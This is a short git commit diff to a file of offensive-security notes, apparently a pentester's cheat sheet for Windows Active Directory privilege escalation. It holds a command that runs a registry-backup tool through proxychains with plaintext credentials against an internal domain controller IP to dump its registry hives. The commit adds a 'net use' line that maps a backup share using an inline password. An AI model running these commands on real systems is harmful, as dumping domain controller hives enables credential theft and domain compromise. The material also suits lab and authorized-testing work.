b8855485d78c493d7965501ca739373e345bb62c
Super Alex Sec <143464761+superalexsec@users.noreply.github.com>
2024-04-12 18:52:39 -0300

    Update DUMP_Reg.py

--- InfoGat/Windows/PrivEsc/AD/DUMP_Reg.py
+++ InfoGat/Windows/PrivEsc/AD/DUMP_Reg.py
@@ -1,3 +1,5 @@
 https://github.com/horizon3ai/backup_dc_registry/tree/main
 
 proxychains python reg.py joe:'Flowers1'@172.16.230.10 backup -p 'C:'
+
+net use H: \\MYSERVER\MYFOLDERS\Backup passywordy /user:Company\JoeUser 
